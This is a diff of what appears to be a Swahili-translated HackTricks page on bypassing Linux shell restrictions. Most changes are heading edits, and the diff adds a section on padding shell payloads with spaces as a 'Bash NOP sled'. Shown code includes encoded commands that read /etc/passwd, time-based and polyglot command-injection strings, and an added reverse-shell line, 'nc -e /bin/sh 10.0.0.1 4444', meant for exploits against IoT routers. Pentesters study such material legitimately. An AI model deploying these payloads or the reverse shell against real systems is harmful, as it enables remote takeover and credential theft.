@@ -110,11 +110,11 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Bypass pipes
+### Kupita mabomba
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Bypass kwa kutumia hex encoding
+### Bypass na hex encoding
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -133,7 +133,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Kupata herufi kutoka kwa Env Variables
+### Kupata herufi kutoka kwa Mabadiliko ya Mazingira
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -197,7 +197,7 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-### Uingiliaji wa amri za polyglot
+### Uingiliaji wa amri wa polyglot
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
@@ -294,25 +294,47 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Bypass ya Read-Only/Noexec/Distroless
+## Read-Only/Noexec/Distroless Bypass
 
-Ikiwa uko ndani ya mfumo wa faili wenye **ulinzi wa read-only na noexec** au hata katika kontena lisilo na mfumo, bado kuna njia za **kutekeleza binaries za kiholela, hata shell!:**
+Ikiwa uko ndani ya mfumo wa faili wenye **kinga za kusoma tu na noexec** au hata katika kontena lisilo na mfumo, bado kuna njia za **kutekeleza binaries zisizo na mpangilio, hata shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Bypass ya Chroot & Jails Nyingine
+## Chroot & other Jails Bypass
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## Marejeo & Zaidi
+## Space-Based Bash NOP Sled ("Bashsledding")
+
+Wakati udhaifu unakuruhusu kudhibiti sehemu fulani ya hoja ambayo hatimaye inafikia `system()` au shell nyingine, huenda usijue offset halisi ambapo utekelezaji unaanza kusoma payload yako.  NOP sleds za jadi (mfano `\x90`) **hazifanyi kazi** katika sintaksia ya shell, lakini Bash itapuuzilia mbali nafasi za mbele kabla ya kutekeleza amri.
+
+Hivyo unaweza kuunda *NOP sled kwa Bash* kwa kuweka amri yako halisi kwa mfululizo mrefu wa nafasi au tab characters:
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+Ikiwa mnyororo wa ROP (au primitive yoyote ya uharibifu wa kumbukumbu) unatua kipanya cha maagizo popote ndani ya block ya nafasi, parser ya Bash inaruka tu nafasi za wazi hadi inafikia `nc`, ikitekeleza amri yako kwa uaminifu.
+
+Matumizi halisi:
+
+1. **Blobs za usanidi zilizopangwa kwa kumbukumbu** (kwa mfano NVRAM) ambazo zinapatikana kati ya michakato.
+2. Hali ambapo mshambuliaji hawezi kuandika bytes za NULL ili kuoanisha payload.
+3. Vifaa vilivyojumuishwa ambavyo vinaweza tu kutumia BusyBox `ash`/`sh` – pia vinapuuzilia mbali nafasi za mbele.
+
+> 🛠️  Changanya hila hii na vifaa vya ROP vinavyopiga simu `system()` ili kuongeza kwa kiasi kikubwa uaminifu wa exploit kwenye route za IoT zenye ukosefu wa kumbukumbu.
+
+## Marejeleo na Zaidi
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
